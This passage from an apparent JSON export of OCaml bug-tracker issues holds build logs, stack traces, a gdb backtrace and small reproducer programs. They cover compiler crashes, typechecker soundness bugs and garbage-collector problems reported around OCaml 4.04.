/home/khm/.opam/4.04.0+spacetime/lib/ocaml/compiler-libs/location.cmi camlp4/import/location.cmi\r\ncp /home/khm/.opam/4.04.0+spacetime/lib/ocaml/compiler-libs/longident.cmi camlp4/import/longident.cmi\r\ncp /home/khm/.opam/4.04.0+spacetime/lib/ocaml/compiler-libs/asttypes.cmi camlp4/import/asttypes.cmi\r\ncp /home/khm/.opam/4.04.0+spacetime/lib/ocaml/compiler-libs/parsetree.cmi camlp4/import/parsetree.cmi\r\ncp /home/khm/.opam/4.04.0+spacetime/lib/ocaml/compiler-libs/outcometree.cmi camlp4/import/outcometree.cmi\r\ncp /home/khm/.opam/4.04.0+spacetime/lib/ocaml/compiler-libs/oprint.cmi camlp4/import/oprint.cmi\r\ncp /home/khm/.opam/4.04.0+spacetime/lib/ocaml/compiler-libs/toploop.cmi camlp4/import/toploop.cmi\r\ncp /home/khm/.opam/4.04.0+spacetime/lib/ocaml/compiler-libs/topdirs.cmi camlp4/import/topdirs.cmi\r\n/home/khm/.opam/4.04.0+spacetime/bin/ocamlc.opt -c -g -safe-string -w Z -I camlp4/import -I camlp4/config -I camlp4 -o camlp4/config/Camlp4_config.cmi camlp4/config/Camlp4_config.mli\r\n/home/khm/.opam/4.04.0+spacetime/bin/ocamlc.opt -c -g -safe-string -w a -I camlp4/import -I camlp4/config -I camlp4/boot -o camlp4/boot/Camlp4.cmo camlp4/boot/Camlp4.ml\r\n/home/khm/.opam/4.04.0+spacetime/bin/ocamlc.opt -c -g -safe-string -w a -I camlp4/import -I camlp4/config -I camlp4/boot -o camlp4/boot/camlp4boot.cmo camlp4/boot/camlp4boot.ml\r\n/home/khm/.opam/4.04.0+spacetime/bin/ocamldep.opt -modules camlp4/config/Camlp4_config.ml > camlp4/config/Camlp4_config.ml.depends\r\n/home/khm/.opam/4.04.0+spacetime/bin/ocamldep.opt -modules camlp4/config/gen_import.ml > camlp4/config/gen_import.ml.depends\r\n/home/khm/.opam/4.04.0+spacetime/bin/ocamlc.opt -c -g -safe-string -w Z -I +compiler-libs -I camlp4/import -I camlp4/config -I camlp4 -o camlp4/config/gen_import.cmo camlp4/config/gen_import.ml\r\n/home/khm/.opam/4.04.0+spacetime/bin/ocamlc.opt dynlink.cma -g -I +compiler-libs ocamlcommon.cma camlp4/config/gen_import.cmo -o camlp4/config/gen_import.byte\r\ncamlp4/config/gen_import.byte /home/khm/.opam/4.04.0+spacetime/lib/ocaml\r\n/home/khm/.opam/4.04.0+spacetime/bin/ocamldep.opt -modules camlp4/config/Camlp4_import.ml > camlp4/config/Camlp4_import.ml.depends\r\n/home/khm/.opam/4.04.0+spacetime/bin/ocamlc.opt -c -g -safe-string -w Z -I camlp4/import -I camlp4/config -I camlp4 -o camlp4/config/Camlp4_import.cmo camlp4/config/Camlp4_import.ml\r\n/home/khm/.opam/4.04.0+spacetime/bin/ocamlopt.opt -c -g -safe-string -w Z -I camlp4/import -I camlp4/config -I camlp4 -o camlp4/config/Camlp4_import.cmx camlp4/config/Camlp4_import.ml\r\n/home/khm/.opam/4.04.0+spacetime/bin/ocamlopt.opt -c -g -safe-string -w Z -I camlp4/import -I camlp4/config -I camlp4 -o camlp4/config/Camlp4_config.cmx camlp4/config/Camlp4_config.ml\r\n/home/khm/.opam/4.04.0+spacetime/bin/ocamlopt.opt -c -g -safe-string -w a -I camlp4/import -I camlp4/config -I camlp4/boot -o camlp4/boot/Camlp4.cmx camlp4/boot/Camlp4.ml\r\n/home/khm/.opam/4.04.0+spacetime/bin/ocamlopt.opt -c -g -safe-string -w a -I camlp4/import -I camlp4/config -I camlp4/boot -o camlp4/boot/camlp4boot.cmx camlp4/boot/camlp4boot.ml\r\n+ /home/khm/.opam/4.04.0+spacetime/bin/ocamlopt.opt -c -g -safe-string -w a -I camlp4/import -I camlp4/config -I camlp4/boot -o camlp4/boot/camlp4boot.cmx camlp4/boot/camlp4boot.ml\r\nFatal error: exception Stack overflow\r\nRaised by primitive operation at file \"asmcomp/spill.ml\", line 70, characters 17-55\r\nCalled from file \"asmcomp/spill.ml\", line 157, characters 13-58\r\nCalled from file \"asmcomp/spill.ml\", line 160, characters 32-51\r\nCalled from file \"asmcomp/spill.ml\", line 170, characters 37-57\r\nCalled from file \"asmcomp/spill.ml\", line 160, characters 32-51\r\nCalled from file \"asmcomp/spill.ml\", line 160, characters 32-51\r\nCalled from file \"asmcomp/spill.ml\", line 160, characters 32-51\r\nCalled from file \"asmcomp/spill.ml\", line 160, characters 32-51\r\nCalled from file \"asmcomp/spill.ml\", line 160, characters 32-51\r\nCalled from file \"asmcomp/spill.ml\", line 160, characters 32-51\r\nCalled from file \"asmcomp/spill.ml\", line 160, characters 32-51\r\nCalled from file \"asmcomp/spill.ml\", line 160, characters 32-51\r\nCalled from file \"asmcomp/spill.ml\", line 160, characters 32-51\r\nCalled from file \"asmcomp/spill.ml\", line 160, characters 32-51\r\nCalled from file \"asmcomp/spill.ml\", line 160, characters 32-51\r\nCalled from file \"asmcomp/spill.ml\", line 160, characters 32-51\r\nCalled from file \"asmcomp/spill.ml\", line 160, characters 32-51\r\nCalled from file \"asmcomp/spill.ml\", line 160, characters 32-51\r\nCalled from file \"asmcomp/spill.ml\", line 160, characters 32-51\r\nCalled from file \"asmcomp/spill.ml\", line 173, characters 8-60\r\nCalled from file \"asmcomp/spill.ml\", line 160, characters 32-51\r\nCalled from file \"asmcomp/spill.ml\", line 160, characters 32-51\r\nCalled from file \"asmcomp/spill.ml\", line 160, characters 32-51\r\nCalled from file \"asmcomp/spill.ml\", line 160, characters 32-51\r\nCalled from file \"asmcomp/spill.ml\", line 160, characters 32-51\r\nCalled from file \"asmcomp/spill.ml\", line 160, characters 32-51\r\nCalled from file \"asmcomp/spill.ml\", line 160, characters 32-51\r\nCalled from file \"asmcomp/spill.ml\", line 160, characters 32-51\r\nCalled from file \"asmcomp/spill.ml\", line 160, characters 32-51\r\nCalled from file \"asmcomp/spill.ml\", line 160, characters 32-51\r\nCalled from file \"asmcomp/spill.ml\", line 160, characters 32-51\r\nCalled from file \"asmcomp/spill.ml\", line 160, characters 32-51\r\nCalled from file \"asmcomp/spill.ml\", line 160, characters 32-51\r\nCalled from file \"asmcomp/spill.ml\", line 160, characters 32-51\r\nCalled from file \"asmcomp/spill.ml\", line 173, characters 8-60\r\nCalled from file \"asmcomp/spill.ml\", line 160, characters 32-51\r\nCalled from file \"asmcomp/spill.ml\", line 160, characters 32-51\r\nCalled from file \"asmcomp/spill.ml\", line 160, characters 32-51\r\nCalled from file \"asmcomp/spill.ml\", line 160, characters 32-51\r\nCalled from file \"asmcomp/spill.ml\", line 160, characters 32-51\r\nCalled from file \"asmcomp/spill.ml\", line 160, characters 32-51\r\nCalled from file \"asmcomp/spill.ml\", line 160, characters 32-51\r\nCalled from file \"asmcomp/spill.ml\", line 160, characters 32-51\r\nCalled from file \"asmcomp/spill.ml\", line 160, characters 32-51\r\nCalled from file \"asmcomp/spill.ml\", line 160, characters 32-51\r\nCalled from file \"asmcomp/spill.ml\", line 160, characters 32-51\r\nCalled from file \"asmcomp/spill.ml\", line 160, characters 32-51\r\nCalled from file \"asmcomp/spill.ml\", line 160, characters 32-51\r\nCalled from file \"asmcomp/spill.ml\", line 173, characters 8-60\r\nCalled from file \"asmcomp/spill.ml\", line 160, characters 32-51\r\nCalled from file \"asmcomp/spill.ml\", line 160, characters 32-51\r\nCalled from file \"asmcomp/spill.ml\", line 160, characters 32-51\r\nCalled from file \"asmcomp/spill.ml\", line 160, characters 32-51\r\nCalled from file \"asmcomp/spill.ml\", line 160, characters 32-51\r\nCalled from file \"asmcomp/spill.ml\", line 147, characters 32-52\r\nCalled from file \"asmcomp/spill.ml\", line 160, characters 32-51\r\nCalled from file \"asmcomp/spill.ml\", line 160, characters 32-51\r\nCalled from file \"asmcomp/spill.ml\", line 160, characters 32-51\r\n[...]\r\nCalled from file \"asmcomp/spill.ml\", line 160, characters 32-51\r\nCalled from file \"asmcomp/spill.ml\", line 160, characters 32-51\r\nCalled from file \"asmcomp/spill.ml\", line 160, characters 32-51\r\nCalled from file \"asmcomp/spill.ml\", line 160, characters 32-51\r\nCalled from file \"asmcomp/spill.ml\", line 160, characters 32-51\r\nCalled from file \"asmcomp/spill.ml\", line 160, characters 32-51\r\nCalled from file \"asmcomp/spill.ml\", line 160, characters 32-51\r\nCalled from file \"asmcomp/spill.ml\", line 160, characters 32-51\r\nCalled from file \"asmcomp/spill.ml\", line 173, characters 8-60\r\nCalled from file \"asmcomp/spill.ml\", line 160, characters 32-51\r\nCalled from file \"asmcomp/spill.ml\", line 160, characters 32-51\r\nCalled from file \"asmcomp/spill.ml\", line 160, characters 32-51\r\nCalled from file \"asmcomp/spill.ml\", line 160, characters 32-51\r\nCalled from file \"asmcomp/spill.ml\", line 160, characters 32-51\r\nCalled from file \"asmcomp/spill.ml\", line 160, characters 32-51\r\nCommand exited with code 2.\r\nMakefile:13: recipe for target 'byte' failed\n\n## Steps to reproduce\n\n1. opam switch 4.04.0+spacetime\r\n2. eval `opam config env`\r\n3. opam install \"camlp4.4.04+1\"\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7434\n**Reporter:** awson\n**Assigned to:** @mshinwell\n**Status:** closed (set by @mshinwell on 2016-12-16T13:27:17Z)\n**Resolution:** duplicate\n**Priority:** normal\n**Severity:** major\n**Version:** 4.04.0\n**Category:** ~DO NOT USE (was: OCaml general)\n**Related to:** #7426\n\n## Bug description\n\nOn this:\r\n\r\nclass foo = object\r\n  val mutable bar = 0.0\r\nend\r\n\r\nOcaml 4.04+flambda spits:\r\n\r\n>> Fatal error: Assignment of a float to a specialised non-float array: (array.unsafe_set[addr]<>\r\n                                                          self/22 bar/18\r\n                                                          Parraysetu_arg/30)\r\nFatal error: exception Misc.Fatal_error\r\n\r\nBtw, his makes it unable to compile Coq IDE (fileOps.ml).\n"},{"labels":["bug",null,null],"text":"**Original bug ID:** 7433\n**Reporter:** joris\n**Status:** resolved (set by @xavierleroy on 2017-02-19T17:08:16Z)\n**Resolution:** suspended\n**Priority:** normal\n**Severity:** minor\n**Platform:** linux\n**Category:** runtime system and C interface\n**Monitored by:** @ygrek @Yakobowski\n\n## Bug description\n\nWhen the heap becomes quite large, compaction can be really slow to run, taking several minutes. One solution is to increase Gc.max_overhead or periodically trigger compaction when stalling the program for several minutes won't be an issue.\r\nIn this case though, another issue emerge. In some cases, minor Gc can takes several minutes to complete.\r\n\r\nFor instance, this is an example of heap where the issue arise :\r\n\r\n[2016-12-16T01:38:41.4598] 39191:0 [memory:info] GC: Heap: 66.4GB (max 66.4GB, chunks 8414) Counters(mi,pr,ma): 54.0TB 2.0TB 3.2TB Collections(mv,ma,mi): 7 1607 14680433\r\n[2016-12-16T01:38:42.9726] 39191:0 [memory:info] VM: rss 68.7GB, vsz 72.5GB, swap 0B, maps 332. MALLOC: size 72.1GB, used 68.9GB, free 1.8GB\r\n\r\nIn this case, the process became stuck for 6 minutes performing a minor collection:\r\n\r\n      7 caml_fl_allocate caml_alloc_shr caml_oldify_one caml_oldify_mopup caml_empty_minor_heap caml_minor_collection caml_make_vect Array.init Tableq.check Tableq.setup_writer List.iter Tableq.start Supertable.on_new_txn Supertable.master_handle Messaging.callback Messaging.#1645\r\n      3 caml_fl_add_blocks caml_alloc_shr caml_oldify_one caml_oldify_mopup caml_empty_minor_heap caml_minor_collection caml_make_vect Array.init Tableq.check Tableq.setup_writer List.iter Tableq.start Supertable.on_new_txn Supertable.master_handle Messaging.callback Messaging.#1645\r\n\r\nWith the following parameters :\r\n Minor heap size 64MB\r\n Compact disabled, performed once an hour manually\r\n Space overhead 50\n\n## Steps to reproduce\n\nThe informations provided here are probably not enough to reproduce, if you have suggestions on how to find more detailed information i run some tests.\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7432\n**Reporter:** @yallop\n**Assigned to:** @garrigue\n**Status:** resolved (set by @garrigue on 2016-12-17T01:38:18Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Fixed in version:** 4.05.0 +dev/beta1/beta2/beta3/rc1\n**Category:** typing\n**Monitored by:** @hcarty\n\n## Bug description\n\nThe -labels and -nolabels modes of the compiler have different views of type equality.  There are some types that are considered equal with -nolabels, but incompatible with -labels.\r\n\r\nIt's possible, therefore, to pass a witness of type equality (compiled with -nolabels) to a function compiled (with -labels) under the assumption that no such witness can exist, leading to a crash.\r\n\r\nHere's a demonstration:\r\n\r\n    $ cat a.ml \r\n    type (_,_) eql = Refl : ('a, 'a) eql\r\n    type s = x:int -> y:float -> unit\r\n    type t = y:int -> x:float -> unit\r\n    let eql : (s, t) eql = Refl\r\n    $ cat b.ml \r\n    open A\r\n\r\n    type silly = {silly: 'a.'a}\r\n\r\n    let f : [`L of (s, t) eql | `R of silly] -> 'a =\r\n       function `R {silly} -> silly\r\n    let () = print_endline (f (`L A.eql))\r\n    $ ocamlopt -c -nolabels a.ml  && ocamlopt -c  b.ml && ocamlopt a.cmx b.cmx -o a.out\r\n    $ ./a.out \r\n    Segmentation fault\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7431\n**Reporter:** alexmarkley\n**Assigned to:** @mshinwell\n**Status:** closed (set by @mshinwell on 2016-12-22T07:16:05Z)\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** crash\n**Platform:** x86_64\n**OS:** Linux\n**OS Version:** Fedora 25\n**Version:** 4.04.0\n**Category:** runtime system and C interface\n\n## Bug description\n\nWhen running the Unison File Synchronizer (a project written in OCaml: https://www.cis.upenn.edu/~bcpierce/unison/index.html ) against a large replica (1TB), I am encountering a showstopping segfault every single time.\r\n\r\n- I have tried multiple versions of Unison, including stable versions which were working fine for me in the past and newer beta versions.\r\n\r\n- I initially tried the official Fedora builds of OCaml (4.02.3-3) and when I was having no success with those, I removed them from my system and I built/installed OCaml 4.04.0 myself.\r\n\r\n- I finally got a really good backtrace (included in this report) running OCaml 4.04 and Unison git master. As you can see, the segmentation fault occurred within the OCaml heap compaction portion of the garbage collection routine.\r\n\r\n- It is worth noting that I never had this problem in earlier releases of Fedora, even with the same or earlier versions of OCaml and Unison. (I'm not sure what this implies, except that perhaps the bug is actually being triggered by a lower-level system component, like GCC or a system library.)\r\n\r\nRelated bug reports:\r\n\r\nhttps://bugzilla.redhat.com/show_bug.cgi?id=1401759\r\n\r\nhttps://github.com/bcpierce00/unison/issues/48\n\n## Steps to reproduce\n\nNOTE: These steps may only successfully reproduce the issue if the client is running Fedora 25 on x86_64, and if both OCaml and Unison were built on that machine.\r\n\r\n1. Create a large, complicated dataset on the server for Unison to synchronize. Ideally this will be over 1TB in size and require over 2 hours to transfer.\r\n\r\n2. Perform a synchronization between the client and the server, requiring the majority of the data to be transferred from the server to the client. (This mimics initial synchronization of a new hub/spoke node.)\r\n\r\n3. Observe the client fails to synchronize the entire dataset. Client is terminated with SIGSEGV.\n\n## Additional information\n\n===SNIP===\r\n/home/alex/Temp/galculator-2.1.3/intltool-extract.in has already been transferred\r\n/home/alex/Temp/galculator-2.1.3/intltool-merge.in has already been transferred\r\n/home/alex/Temp/galculator-2.1.3/intltool-update.in has already been transferred\r\n 33%  100:25 ETA\r\nProgram received signal SIGSEGV, Segmentation fault.\r\n0x00000000004ec76b in invert_pointer_at (p=p@entry=0x7fffd38c7b28) at compact.c:90\r\n90      compact.c: No such file or directory.\r\n(gdb) thread apply all bt full\r\n\r\nThread 1 (process 19298):\r\n#0  0x00000000004ec76b in invert_pointer_at (p=p@entry=0x7fffd38c7b28) at compact.c:90\r\n        val = 140736742586384\r\n        hp = 0x7461705f77617264\r\n        q = 140736742586416\r\n#1  0x00000000004ec90c in do_compaction () at compact.c:228\r\n        q = <optimized out>\r\n        i = <optimized out>\r\n        sz = 6\r\n        t = <optimized out>\r\n        infixes = <optimized out>\r\n        p = 0x7fffd38c7b10\r\n        ch = 0x7fffbf2fc000 \"\\363\\273M\"\r\n        chend = 0x7ffff09f1000 \"\"\r\n#2  0x00000000004ecdea in caml_compact_heap () at compact.c:426\r\n        target_wsz = <optimized out>\r\n        live = <optimized out>\r\n#3  0x00000000004ed24a in caml_compact_heap_maybe () at compact.c:547\r\n        fw = <optimized out>\r\n        fp = 170.748871\r\n#4  0x00000000004daf4a in caml_major_collection_slice (howmuch=howmuch@entry=-1) at major_gc.c:785\r\n        p = 0.0043600637275738388\r\n        dp = <optimized out>\r\n        filt_p = 0.0043600637275738388\r\n        spend = <optimized out>\r\n        computed_work = 1522479\r\n        i = <optimized out>\r\n#5  0x00000000004dbedf in caml_gc_dispatch () at minor_gc.c:463\r\n        trigger = <optimized out>\r\n#6  0x00000000004dbf77 in caml_check_urgent_gc (extra_root=<optimized out>) at minor_gc.c:482\r\n        caml__frame = 0x0\r\n        caml__roots_extra_root = {next = 0x0, ntables = 1, nitems = 1, tables = {0x7fffffffd758, 0x7fffffffd870, 0x4dc96a <caml_alloc_shr+170>, 0x22, 0x7fff9d02f6b0}}\r\n#7  0x00000000004dcfe5 in caml_alloc_string (len=65497) at alloc.c:103\r\n        result = <optimized out>\r\n        offset_index = <optimized out>\r\n        wosize = 8188\r\n#8  0x000000000047205c in camlBytearray__sub_1422 () at /root/unison-git/src/bytearray.ml:63\r\nNo locals.\r\n#9  0x0000000000447812 in camlTransfer__receiveRec_1568 () at /root/unison-git/src/transfer.ml:295\r\nNo locals.\r\n#10 0x0000000000427cef in camlCopy__decompr_2936 () at /root/unison-git/src/transfer.ml:304\r\nNo locals.\r\n#11 0x0000000000426bca in camlCopy__fun_3367 () at /root/unison-git/src/copy.ml:401\r\nNo locals.\r\n#12 0x000000000046cc11 in camlUtil__convertUnixErrorsToExn_1955 () at /root/unison-git/src/ubase/util.ml:170\r\nNo locals.\r\n#13 0x000000000043f46a in camlRemote__processStream_2291 () at /root/unison-git/src/remote.ml:664\r\nNo locals.\r\n#14 0x000000000043fe26 in camlRemote__fun_4468 () at /root/unison-git/src/remote.ml:732\r\nNo locals.\r\n#15 0x0000000000464e4d in camlLwt__apply_1225 () at /root/unison-git/src/lwt/lwt.ml:75\r\nNo locals.\r\n#16 0x000000000046510e in camlLwt__fun_1451 () at /root/unison-git/src/lwt/lwt.ml:94\r\nNo locals.\r\n#17 0x000000000048d101 in camlList__iter_1252 () at list.ml:77\r\nNo locals.\r\n#18 0x0000000000464b2e in camlLwt__restart_1211 () at /root/unison-git/src/lwt/lwt.ml:31\r\nNo locals.\r\n#19 0x000000000046182e in camlLwt_unix_impl__fun_2430 () at /root/unison-git/src/lwt/generic/lwt_unix_impl.ml:153\r\nNo locals.\r\n#20 0x000000000048d101 in camlList__iter_1252 () at list.ml:77\r\nNo locals.\r\n#21 0x0000000000461671 in camlLwt_unix_impl__run_1579 () at /root/unison-git/src/lwt/generic/lwt_unix_impl.ml:148\r\nNo locals.\r\n#22 0x000000000040e80a in camlUitext__doTransport_1863 () at /root/unison-git/src/uitext.ml:490\r\nNo locals.\r\n#23 0x000000000040f84e in camlUitext__doit_1922 () at /root/unison-git/src/uitext.ml:556\r\nNo locals.\r\n#24 0x0000000000410034 in camlUitext__synchronizeOnce_1968 () at /root/unison-git/src/uitext.ml:718\r\nNo locals.\r\n#25 0x000000000041094a in camlUitext__loop_2237 () at /root/unison-git/src/uitext.ml:788\r\nNo locals.\r\n#26 0x0000000000410b4d in camlUitext__synchronizeUntilDone_2242 () at /root/unison-git/src/uitext.ml:810\r\nNo locals.\r\n#27 0x0000000000410df7 in camlUitext__start_2249 () at /root/unison-git/src/uitext.ml:870\r\nNo locals.\r\n#28 0x00000000004085fa in camlMain__Body_1550 () at /root/unison-git/src/main.ml:241\r\nNo locals.\r\n#29 0x0000000000407a93 in camlLinktext__entry () at /root/unison-git/src/linktext.ml:19\r\nNo locals.\r\n#30 0x0000000000404369 in caml_program ()\r\nNo symbol table info available.\r\n#31 0x00000000004ef12e in caml_start_program ()\r\nNo symbol table info available.\r\n#32 0x00000000004ef475 in caml_main (argv=0x7fffffffdca8) at startup.c:145\r\n        exe_name = <optimized out>\r\n        proc_self_exe = \"/usr/local/bin/unison\", '\\000' <repeats 234 times>\r\n        res = <optimized out>\r\n        tos = 0 '\\000'\r\n#33 0x0000000000403c5c in main (argc=<optimized out>, argv=<optimized out>) at main.c:37\r\nNo locals.\r\n(gdb)\r\n===SNIP===\n\n## File attachments\n\n- [debug_runtime.txt](https://gist.githubusercontent.com/vicuna/d3b651423eb4cdcf766e7b5f2f19ee1d/raw/f6a630fc55f9bd0690c41260be4a2e75a4115764/debug_runtime.txt)\n- [vagrant_run_unoptimized.txt](https://gist.githubusercontent.com/vicuna/d3b651423eb4cdcf766e7b5f2f19ee1d/raw/ab6b476e926373cbc7c91ed8668c36ca262ff3a9/vagrant_run_unoptimized.txt)\n- [valgrind_run.txt](https://gist.githubusercontent.com/vicuna/d3b651423eb4cdcf766e7b5f2f19ee1d/raw/ef87e033649e7cd170e418ee8fbc0e89fe1cae31/valgrind_run.txt)\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7429\n**Reporter:** @lpw25\n**Assigned to:** @lpw25\n**Status:** resolved (set by @lpw25 on 2016-12-07T16:12:59Z)\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**Version:** 4.04.0\n**Category:** typing\n**Related to:** #6738\n**Monitored by:** @gasche\n\n## Bug description\n\nThe following code:\r\n\r\n  let rec x = lazy (subscribe (fun _ -> (Lazy.force x)));;\r\n\r\nproduces an unused value warning for `x` if it is not used in the rest of the program. However, the binding to `x` is required in this case.\r\n\r\nObviously, the warning is trying to make sure that things like recursive function definitions do not get automatically marked as used just because they are recursive, but it seems that the issue is subtler than how the current check works.\r\n\r\nThis code is pretty unusual, and the work-around is easy (simply rename `x` to `_x`) so it may not be worth fixing if the criteria is too complicated.\n"},{"labels":[null,"bug",null,null],"text":"**Original bug ID:** 7427\n**Reporter:** @sliquister\n**Status:** closed (set by @mshinwell on 2016-12-09T09:02:19Z)\n**Resolution:** duplicate\n**Priority:** high\n**Severity:** minor\n**Version:** 4.03.0\n**Category:** back end (clambda to assembly)\n\n## Bug description\n\nGiven the file [1], the linking usually fails this way:\r\n\r\n$ ocamlopt -version\r\n4.03.0\r\n$ rm -f main.o; ocamlopt main.ml\r\nmain.o: In function `camlMain__ccc_1208':\r\n/path/to/main.ml:8: undefined reference to `camlMain__bbb_1207'\r\ncollect2: ld returned 1 exit status\r\nFile \"caml_startup\", line 1:\r\nError: Error during linking\r\n\r\nAlthough I see sometimes:\r\n$ ocamlopt main.ml\r\n/usr/bin/ld: error in main.o(.eh_frame); no .eh_frame_hdr table will be created.\r\n/usr/bin/ld: main.o: invalid string offset 1126 >= 564 for section `.strtab'\r\n/usr/bin/ld: final link failed: Nonrepresentable section on output\r\ncollect2: ld returned 1 exit status\r\nFile \"caml_startup\", line 1:\r\nError: Error during linking\r\n$ ocamlopt main.ml\r\nmain.o: file not recognized: File truncated\r\ncollect2: ld returned 1 exit status\r\nFile \"caml_startup\", line 1:\r\nError: Error during linking\r\n\r\nand sometimes the link even succeeds.\r\n\r\n[1]\r\n$ cat main.ml\r\nmodule F() = struct\r\n  let ( *>>| ) t f = f t\r\n  let ddd _ = assert false\r\n  module M = struct\r\n    let aaa = ddd (() *>>| fun _ -> assert false)\r\n    let bbb () = () *>>| (fun _ -> assert false)\r\n  end\r\n  let ccc () = M.bbb ()\r\nend\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7426\n**Reporter:** tempodox\n**Status:** closed (set by @mshinwell on 2016-12-12T10:57:23Z)\n**Resolution:** duplicate\n**Priority:** normal\n**Severity:** block\n**Platform:** Unix\n**OS:** Mac OS X\n**OS Version:** 10.11.6\n**Version:** 4.04.0\n**Category:** ~DO NOT USE (was: OCaml general)\n**Has duplicate:** #7474\n**Related to:** #7434 #7499\n**Monitored by:** @gasche\n\n## Bug description\n\nIn 4.04.0+flambda, the following code produces an error from `ocamlopt`:\r\n\r\n<code>\r\nclass virtual abstract =\r\nobject (_ : 'self)\r\n  method virtual scaleby : float -> 'self\r\nend\r\n\r\nclass concrete value =\r\nobject\r\n  inherit abstract\r\n  val _value : float = value\r\n  method value = _value\r\n  method scaleby fac =\r\n    {< _value = fac *. _value >}\r\nend\r\n</code>\r\n\r\nThe error message is:\r\nFatal error: Assignment of a float to a specialised non-float array: (array.unsafe_set[addr]<>\r\n copy/95 _value/92\r\n Pmulfloat/103)\r\nFatal error: exception Misc.Fatal_error\n\n## Steps to reproduce\n\nPut this code in an `ml` file and pass it to `ocamlopt`:\r\n\r\nclass virtual abstract =\r\nobject (_ : 'self)\r\n  method virtual scaleby : float -> 'self\r\nend\r\n\r\nclass concrete value =\r\nobject\r\n  inherit abstract\r\n  val _value : float = value\r\n  method value = _value\r\n  method scaleby fac =\r\n    {< _value = fac *. _value >}\r\nend\n\n## Additional information\n\nIn 4.03+flambda, or `ocamlc` of 4.04+flambda, the same code compiles without error.\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7424\n**Reporter:** @stedolan\n**Assigned to:** @garrigue\n**Status:** resolved (set by @garrigue on 2016-12-10T02:40:28Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Version:** 4.04.0\n**Fixed in version:** 4.05.0 +dev/beta1/beta2/beta3/rc1\n**Category:** typing\n**Monitored by:** @gasche\n\n## Bug description\n\nThe following strange program causes the typechecker to loop infinitely:\r\n\r\n    type 'a b = B of 'a b b [@@unboxed]\n"},{"labels":["bug",null,null],"text":"**Original bug ID:** 7422\n**Reporter:** applause\n**Assigned to:** @dra27\n**Status:** resolved (set by @gasche on 2016-11-27T20:25:15Z)\n**Resolution:** fixed\n**Priority:** urgent\n**Severity:** major\n**Platform:** amd64\n**OS:** Windows 10\n**OS Version:** 10.0.14393\n**Version:** 4.04.0\n**Fixed in version:** 4.05.0 +dev/beta1/beta2/beta3/rc1\n**Category:** platform support (windows, cross-compilation, etc)\n\n## Bug description\n\nSource file otherlibs/win32unix/createprocess.c needs '#define CAML_INTERNALS'\r\nto be properly compiled for amd64 with MSVC.\r\n\r\nWithout CAML_INTERNALS defined this next line gives the following warning.\r\n>  exefile = search_exe_in_path(String_val(cmd));\r\ncreateprocess.c(37): warning C4047: '=': 'char *' differs in levels of indirection from 'int'\r\nAnd this one is critical.\r\n\r\nConfirmed with Visual Studio 2013 and 2015.\n\n## Steps to reproduce\n\nPrograms which use Unix.create_process will always fail.\r\nMaybe ocamlfind.exe of findlib is handy for checking.\n\n## Additional information\n\nHere are quotes from disassemble list of win_create_process_native(), \r\nboth good and wrong.\r\n\r\nGood:\r\n  0000000000018324: E8 68 97 FF FF     call        @ILT+2700(caml_search_exe_in_path)\r\n  0000000000018329: 45 33 FF           xor         r15d,r15d\r\n  000000000001832C: 48 8B D8           mov         rbx,rax\r\n\r\nWrong:\r\n  0000000000055C24: E8 5E BE FB FF     call        @ILT+2690(caml_search_exe_in_path)\r\n  0000000000055C29: 45 33 FF           xor         r15d,r15d\r\n  0000000000055C2C: 48 63 D8           movsxd      rbx,eax\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7421\r\n**Reporter:** @lpw25\r\n**Assigned to:** @garrigue\r\n**Status:** resolved (set by @garrigue on 2016-12-10T02:48:23Z)\r\n**Resolution:** fixed\r\n**Priority:** normal\r\n**Severity:** minor\r\n**Version:** 4.04.0\r\n**Fixed in version:** 4.05.0 +dev/beta1/beta2/beta3/rc1\r\n**Category:** typing\r\n**Monitored by:** @gasche @yallop\r\n\r\n## Bug description\r\n\r\nThe exhaustivity/refutation checks do not taken into account the hidden _|_ member of the lazy type:\r\n\r\n```ocaml\r\n  # type (_, _) eq = Refl : ('a, 'a) eq;;\r\n  type (_, _) eq = Refl : ('a, 'a) eq\r\n  # type empty = (int, unit) eq;;\r\n  type empty = (int, unit) eq\r\n  # let f (x : ('a, empty Lazy.t) result) =\r\n      match x with\r\n      | Ok x -> x\r\n      | Error (lazy _) -> .;;\r\n        val f : ('a, empty Lazy.t) result -> 'a = <fun>\r\n  # (f (Error (lazy (raise Not_found))) : string list list);;\r\n  Segmentation fault\r\n```"},{"labels":["bug",null,null],"text":"**Original bug ID:** 7420\n**Reporter:** @johnwhitington\n**Status:** resolved (set by @xavierleroy on 2017-02-19T17:27:02Z)\n**Resolution:** suspended\n**Priority:** normal\n**Severity:** minor\n**Category:** typing\n\n## Bug description\n\nType annotations on labelled or optional arguments in .ml files are thrown away without warning:\r\n\r\n# let f ?x:int y = y;;\r\nval f : ?x:'a -> 'b -> 'b = <fun>\r\n\r\n# let f ~x:int y = y;;\r\nval f : x:'a -> 'b -> 'b = <fun>\r\n\r\nThe labelled one should be used in the normal way, to restrict the type and the optional one should be rejected, not being an option type, surely? It seems odd to silently drop them.\n\n## Additional information\n\nFor reference, for anyone as easily confused as me, here is a .mli/.ml pair which typechecks for such a function\r\n\r\nval f : ?x:int -> 'a -> 'a\r\n\r\nlet f ?(x : int option) y = y\r\n\r\nThe option-ness of the type of 'x' is implicit in the .mli, explicit in the .ml.\n"},{"labels":["bug",null,null],"text":"**Original bug ID:** 7418\n**Reporter:** @shindere\n**Status:** acknowledged (set by @xavierleroy on 2017-02-20T12:46:03Z)\n**Resolution:** open\n**Priority:** normal\n**Severity:** tweak\n**Version:** later\n**Target version:** later\n**Category:** platform support (windows, cross-compilation, etc)\n**Monitored by:** @dra27\n\n## Bug description\n\nAs discussed on #924(https://github.com/ocaml/ocaml/pull/924),\r\nthe macro _WIN32_WINNT whose value defines the minimal version of\r\nWindows required to run a specific piece of code is defined\r\nseveral times in OCaml sources, with different values.\r\n\r\nIt seems suitable to figure out whether this is the right thing to do, or whether it wouln't be better to define one value for this macro that would be satisfactory for the whole OCaml source code.\n"},{"labels":[null,"bug"],"text":"**Original bug 